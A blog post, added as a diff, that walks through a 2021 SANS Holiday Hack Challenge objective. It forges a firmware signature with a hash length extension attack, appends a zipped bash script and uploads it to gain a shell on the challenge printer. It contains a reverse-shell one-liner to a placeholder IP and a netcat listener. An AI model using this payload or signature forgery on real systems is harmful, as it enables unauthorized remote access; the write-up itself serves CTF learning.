@@ -1,0 +1,183 @@
+---
+title:  "Objective 7: Printer Exploitation - 2021 SANS Holiday Hack Challenge"
+date:   "2022-01-05 00:07:00 -0800"
+categories: HolidayHack2021
+header:
+ teaser: /assets/images/HolidayHack2021/printer_site.png
+ image: /assets/images/HolidayHack2021/printer_site.png
+---
+
+We're building some more penetration testing skills in this challenge. 
+
+[Play the 2021 SANS Holiday Hack Challenge](https://2021.kringlecon.com/invite)
+
+## Objective
+In this objective, we're asked to do the following:
+>Investigate the stolen [Kringle Castle printer](https://printer.kringlecastle.com/). Get shell access to read the contents of ''/var/spool/printer.log'. What is the name of the last file printed (with a ''.xlsx' extension)?
+
+## Hints
+- When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded.
+- [Hash Extension Attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) can be super handy when there's some type of validation to be circumvented.
+- Files placed in `/app/lib/public/incoming` will be accessible under [https://printer.kringlecastle.com/incoming/](https://printer.kringlecastle.com/incoming/).
+- Did you know that if you append multiple firmware files, the last one is processed?
+
+## Enumeration
+Heading to [https://printer.kringlecastle.com/](https://printer.kringlecastle.com/) gives us a printer management site.
+
+![Printer Management Site](/assets/images/HolidayHack2021/printer_site.png)
+
+Some of the options under "settings" and "reports" look interesting, but they are all protected by a password.
+
+On the "firmware" tab, we can download the current firmware and upload new firmware, so that's something. Let's download the current firmware to start.
+
+The firmware is a JSON file. Here's what it looks like:
+
+```json
+{
+	"firmware" : <Giant base-64 encoded string>,
+	"signature" : "e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23",
+	"secret_length" : 16,
+	"algorithm" : "SHA256"
+
+}
+```
+
+I can tell that the string is base-64 encoded because it ends with `==`, like many (but not all) base-64 strings.
+
+Seems like the signature is likely some kind of combination of the secret plus the firmware all hashed together.
+
+Let's take the firmware over to [CyberChef](https://gchq.github.io/CyberChef/) to decode it.
+
+We'll throw the big string into the input field and we'll start with a 'From Base64' operation. That gives us mostly garbage out, but I can see some readable text ("firmware.bin") at the beginning and end, so we're on the right track.
+
+Adding a 'Detect File Type' operation tells us it's a zip archive. Let's download this as `current_firmware.zip`
+
+This zip file contains `firmware.bin`. Not much we can do with this file since it's not human-readable at the moment, but it's good to know what's in the zip.
+
+## Exploitation
+
+We can use some of the hints here:
+- If we append a second zipped firmware file to our first zipped firmware file, the second one should be the one that executes.
+- We can use the [hash_extender](https://github.com/iagox86/hash_extender) tool linked at the [Hash Extension Attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) link to fake the signature with the second file appended.
+
+
+### Installing Hash Extender
+Let's clone the hash_extender repository to our local machine.
+```bash
+git clone https://github.com/iagox86/hash_extender.git
+```
+
+Then we'll compile it:
+```bash
+cd hash_extender
+make
+./hash_extender_test
+```
+
+The tests passed, so we should be good to go.
+
+### Prepping the Payload
+
+Let's see if we can get away with something simple first. We'll just create a bash script and call it `firmware.bin`.
+
+```bash
+#! /bin/bash
+
+/bin/bash -i >& /dev/tcp/<YOUR PUBLIC IP ADDRESS>/9002 0>&1
+```
+
+This should send us a reverse shell when it is run. I'm using port 9002 for no particular reason other than the fact that it's unlikely to conflict with any other running processes.
+
+**Note:** Depending on your situation, when doing this, you may need to set up port forwarding on your router to send incoming traffic on port 9002 (or whatever port you chose) to your attacker machine.
+
+Then we can zip the file up:
+```bash
+zip new_firmware.zip firmware.bin
+```
+
+Now we can turn our attention back to hash extender. What it is going to do for us is take the `current_firmware.zip` file, add some padding after it,  append the `new_firmware.zip` file we created, and forge a new signature that works for both files together.
+
+The problem is that hash extender requires us to add the contents of what we want to append (`new_firmware.zip`) as a command-line argument, which doesn't work well for zip files.
+
+The easiest way I found to do this was to encode the `new_firmware.zip` file to hex first using [CyberChef](https://gchq.github.io/CyberChef/).
+
+**Procedure:**
+1. Choose "Open file as input" in the top right hand corner of the input box
+2. Add a "To Hex" operation to the Recipe
+3. Change the delimiter to "None"
+
+Now the output is the hex-encoded version of `new_firmware.zip` and it's ready to go into hash extender.
+
+```bash
+./hash_extender --file current_firmware.zip --secret 16 --format sha256 --signature "e0b5855c6dd61ceb1e0ae694e68f16a74adb6f87d1e9e2f78adfee688babcf23" --append-format hex -a "<INSERT NEW HEX-ENCODED FIRMWARE>"
+```
+
+**What are all these flags?**
+- **-file:** This will allow us to use the existing firmware zip file as the "data" just by specifying the filename/filepath.
+- **-secret:** This is the length of the secret, which we obtained from the current firmware JSON file.
+- **-format:** This is the hash function used to create the signature. This was also obtained from the current firmware JSON file.
+- **-signature:** This is the signature that was listed in the current firmware JSON file.
+- **-append-format:** We encoded `new_firmware.zip` to hex, so we need to tell hash extender that.
+- **-a:** The data we want to append. This is the hex-encoded 'new_firmware.zip' we got from CyberChef.
+
+
+The output of this command contains a hex-encoded version of our appended firmware and our new signature.
+
+Now we have to change the encoding on the appended firmware from hex to Base64. Back to [CyberChef](https://gchq.github.io/CyberChef/)!
+
+Procedure:
+1. Paste the hex-encoded version of the appended firmware into the input field
+2. Add a "From Hex" step to the recipe
+3. Add a "To Base64" set to the recipe under the "From Hex" step
+
+Now the output should be our Base64-encoded payload!
+
+Let's stick it into the JSON format that the server accepts along with the forged signature from the hash extender output.
+
+I'm calling this file `new_firmware.json`
+
+```json
+{
+	"firmware" : <Giant base-64 encoded string>,
+	"signature" : <Forged Signature>,
+	"secret_length" : 16,
+	"algorithm" : "SHA256"
+}
+```
+
+Now let's start a netcat listener in our terminal: 
+```bash
+nc -lvnp 9002
+```
+
+Once we upload `new_firmware.json` to the site, our listener catches a shell!
+
+```bash
+listening on [any] 9002 ...
+connect to [<IP>] from (UNKNOWN) [34.72.79.63] 49418
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+app@hhc21-printer-v2:/app$
+```
+
+Now all we have to do is run:
+```bash
+cat /var/spool/printer.log
+```
+
+Output:
+```
+Documents queued for printing
+=============================
+
+Biggering.pdf
+Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf
+LowEarthOrbitFreqUsage.txt
+Best Winter Songs Ever List.doc
+Win People and Influence Friends.pdf
+Q4 Game Floor Earnings.xlsx
+Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
+Troll_Pay_Chart.xlsx
+```
+
+**Answer:** Troll_Pay_Chart.xlsx
